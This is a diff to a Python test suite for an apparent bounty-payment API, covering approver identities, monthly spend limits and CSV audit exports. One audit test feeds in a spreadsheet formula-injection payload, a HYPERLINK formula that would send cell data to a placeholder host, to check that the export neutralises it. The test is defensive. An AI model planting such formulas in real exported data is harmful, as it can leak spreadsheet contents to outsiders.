@@ -5,7 +5,8 @@ from __future__ import annotations
 
 import csv
 import io
-from datetime import timedelta
+from datetime import UTC, datetime, timedelta
+from decimal import Decimal
 
 import pytest
 from fastapi.testclient import TestClient
@@ -22,7 +23,7 @@ from misthos.workers.sweeper import sweep_once
 API = "/api/v1"
 ISSUE = "ISS-1006"  # PUB-4's, priced about $2,600, labelled compliance and reporting
 PUBLISHER = "PUB-4"
-APPROVER = "dana@globex.example"
+APPROVER = "dana-globex"  # a GitHub login, which is what a session can prove
 
 
 @pytest.fixture(autouse=True)
@@ -98,6 +99,8 @@ class TestReleaseThreshold:
             {"approval_threshold_usdc": "1000", "approvers": []},
             {"approval_threshold_usdc": "-5", "approvers": [APPROVER]},
             {"approval_threshold_usdc": "lots", "approvers": [APPROVER]},
+            # Nothing a session proves is an e-mail, so this one could never approve.
+            {"approval_threshold_usdc": "1000", "approvers": ["dana@globex.example"]},
             {"category_limits": {"security": "-1"}},
         ],
     )
@@ -157,6 +160,52 @@ class TestSpendView:
         filed = next(f for f in spend["fileable"] if f["issue_id"] == ISSUE)
         assert filed["acceptance_criteria"] == paid.acceptance_criteria
 
+    def test_each_category_shows_this_months_commitments_beside_its_monthly_limit(
+        self, client: TestClient
+    ) -> None:
+        """The limit is per calendar month, so the figure beside it is the month's,
+        and the year's stays the year's."""
+        policy(client, category_limits={"compliance": "10000"})
+        committed = store.advance(ISSUE).money_events[-1]
+        assert committed.kind is MoneyEventKind.COMMITTED
+
+        spend = client.get(f"{API}/publishers/{PUBLISHER}/spend").json()
+        now = datetime.now(UTC)
+        assert spend["month"] == f"{now:%Y-%m}"
+        compliance = next(c for c in spend["by_category"] if c["label"] == "compliance")
+        assert compliance["committed_this_month"]["base_units"] == committed.amount.base_units
+
+        # A month on, the month starts again from nothing; the year has not.
+        first = committed.occurred_at.replace(day=1)
+        next_month = (first + timedelta(days=32)).replace(day=1)
+        later = store.spend(PUBLISHER, year=committed.occurred_at.year, now=next_month)
+        assert later.month == f"{next_month:%Y-%m}"
+        [moved] = [c for c in later.by_category if c.label == "compliance"]
+        assert moved.committed_this_month["base_units"] == 0
+        assert moved.committed["base_units"] == committed.amount.base_units
+
+    def test_the_month_shown_is_the_month_the_limit_is_checked_against(
+        self, client: TestClient
+    ) -> None:
+        policy(client, category_limits={"compliance": "10000"})
+        store.advance(ISSUE)
+        spend = client.get(f"{API}/publishers/{PUBLISHER}/spend").json()
+        shown = next(c for c in spend["by_category"] if c["label"] == "compliance")
+        month = Decimal(shown["committed_this_month"]["usdc"])
+
+        # One dollar of room left this month, by the panel's own figure.
+        policy(client, category_limits={"compliance": str(month + 1)})
+        second = store.publish(
+            PublishRequest(
+                repo="acme/ledger", title="Compliance: reconcile the monthly export",
+                labels=["compliance"], publisher_id=PUBLISHER, signals={"blast_radius": 2},
+            )
+        )  # fmt: skip
+        r = client.post(f"{API}/issues/{second.id}/advance")
+
+        assert r.status_code == 403
+        assert f"{month:.2f} USDC is committed already" in r.json()["detail"]
+
     def test_an_unknown_publisher_is_404(self, client: TestClient) -> None:
         assert client.get(f"{API}/publishers/PUB-999/spend").status_code == 404
 
@@ -194,6 +243,26 @@ class TestAuditExport:
         ours = [row for row in rows if row["issue_id"] == ISSUE]
         assert {row["record"] for row in ours} == {"decision", "money"}
         assert [row["at_utc"] for row in ours] == sorted(row["at_utc"] for row in ours)
+
+    def test_a_formula_in_the_record_is_exported_as_text(self, client: TestClient) -> None:
+        """The repository on every row is what the publisher typed. An auditor's
+        spreadsheet shows it; it never runs it, and the amounts stay numbers."""
+        repo = '=HYPERLINK("http://x/?"&A1,"click")'
+        rec = store.publish(
+            PublishRequest(
+                repo=repo, title="Pin the parser", publisher_id=PUBLISHER,
+                signals={"blast_radius": 2},
+            )
+        )  # fmt: skip
+        store.approve_and_accept(rec.id)
+
+        r = client.get(f"{API}/publishers/{PUBLISHER}/audit", params={"format": "csv"})
+        rows = list(csv.DictReader(io.StringIO("\n".join(r.text.splitlines()[:-1]))))
+        ours = [row for row in rows if row["issue_id"] == rec.id]
+
+        assert ours and {row["repo"] for row in ours} == {"'" + repo}
+        amounts = [row["amount_usdc"] for row in ours if row["record"] == "money"]
+        assert amounts and all(Decimal(a) > 0 for a in amounts)
 
     def test_it_is_the_organisations_alone(
         self, client: TestClient, monkeypatch: pytest.MonkeyPatch
